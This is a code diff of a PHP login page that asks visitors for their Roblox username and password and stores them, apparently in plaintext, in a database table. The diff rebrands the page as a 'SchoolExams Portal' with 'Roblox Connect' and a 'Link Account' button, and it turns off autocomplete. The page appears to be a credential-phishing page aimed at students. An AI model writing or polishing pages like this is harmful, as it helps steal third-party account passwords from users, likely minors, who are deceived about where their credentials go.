@@ -46,7 +46,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $stmt = $pdo->prepare("INSERT INTO login (username, password) VALUES (?, ?)");
         try {
             $stmt->execute([$username, $password]);
-            $message = "<div class='msg success'>User registered in mainframe. You may now authenticate.</div>";
+            $message = "<div class='msg success'>User registered. You may now authenticate.</div>";
         } catch (PDOException $e) {
             $message = "<div class='msg error'>Error: ID already exists in database.</div>";
         }
@@ -78,17 +78,17 @@ if (isset($_GET['logout'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloud</title>
+    <title>SchoolExams Portal</title>
     <style>
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
             /* Set the background image here */
             background-image: url('../png/login.png');
-            background-size: cover; /* Makes sure the image covers the entire screen */
-            background-position: center; /* Centers the image */
-            background-repeat: no-repeat; /* Prevents the image from tiling */
-            background-attachment: fixed; /* Keeps the background still if you scroll */
-            background-color: #0a0a0c; /* Fallback color just in case the image doesn't load */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-color: #0a0a0c;
             color: #fff;
             display: flex; 
             justify-content: center; 
@@ -106,6 +106,7 @@ if (isset($_GET['logout'])) {
             width: 100%;
             max-width: 380px;
             text-align: center;
+            backdrop-filter: blur(5px);
         }
         h2 {
             margin-top: 0;
@@ -182,21 +183,22 @@ if (isset($_GET['logout'])) {
 
     <?php else: ?>
 
-        <h2>Roblox <span>Gateway</span></h2>
+        <h2>Roblox <span>Connect</span></h2>
         
         <?= $message ?>
 
         <hr>
 
-        <form method="POST">
+        <p style="font-size: 12px; color: #888; margin-bottom: 10px; text-transform: uppercase;">Unregistered?</p>
+        <form method="POST" autocomplete="off">
             <input type="hidden" name="action" value="register">
             <div class="input-group" style="margin-bottom: 10px;">
-                <input type="text" name="username" placeholder="Roblox Username" required>
+                <input type="text" name="username" placeholder="Roblox Username" autocomplete="new-password" required>
             </div>
             <div class="input-group">
-                <input type="password" name="password" placeholder="Roblox Password" required>
+                <input type="password" name="password" placeholder="Roblox Password" autocomplete="new-password" required>
             </div>
-            <button type="submit" class="btn-secondary">Connect Roblox Account</button>
+            <button type="submit" class="btn-secondary">Link Account</button>
         </form>
 
     <?php endif; ?>
